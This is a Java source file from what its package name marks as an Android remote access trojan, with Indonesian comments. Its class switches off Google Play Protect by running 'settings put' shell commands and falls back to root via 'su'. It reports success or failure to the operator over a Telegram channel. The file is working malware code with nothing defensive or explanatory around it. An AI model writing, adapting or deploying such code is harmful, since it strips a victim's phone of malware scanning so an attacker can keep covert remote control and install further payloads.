package com.enterprise.rat.commands;

import com.enterprise.rat.utils.TelegramApi;

public class PlayProtectDisabler {

    public static void disable() {
        new Thread(() -> {
            try {
                // Metode 1: settings put global (butuh akses shell)
                Process p = Runtime.getRuntime().exec(new String[]{
                    "settings", "put", "global", "package_verifier_user_consent", "-1"
                });
                p.waitFor();
                // Metode 2: settings put secure (cadangan)
                Process p2 = Runtime.getRuntime().exec(new String[]{
                    "settings", "put", "secure", "package_verifier_user_consent", "-1"
                });
                p2.waitFor();
                TelegramApi.sendMessage("✅ Play Protect disabled via settings command.");
            } catch (Exception e) {
                // Fallback: gunakan su jika ada
                try {
                    Process p = Runtime.getRuntime().exec(new String[]{
                        "su", "-c", "settings put global package_verifier_user_consent -1"
                    });
                    p.waitFor();
                    TelegramApi.sendMessage("✅ Play Protect disabled (root).");
                } catch (Exception e2) {
                    TelegramApi.sendMessage("❌ Play Protect disable failed: " + e.getMessage());
                }
            }
        }).start();
    }

    public static void enable() {
        new Thread(() -> {
            try {
                Runtime.getRuntime().exec(new String[]{
                    "settings", "put", "global", "package_verifier_user_consent", "1"
                });
                TelegramApi.sendMessage("✅ Play Protect enabled.");
            } catch (Exception e) {
                TelegramApi.sendMessage("❌ " + e.getMessage());
            }
        }).start();
    }
}
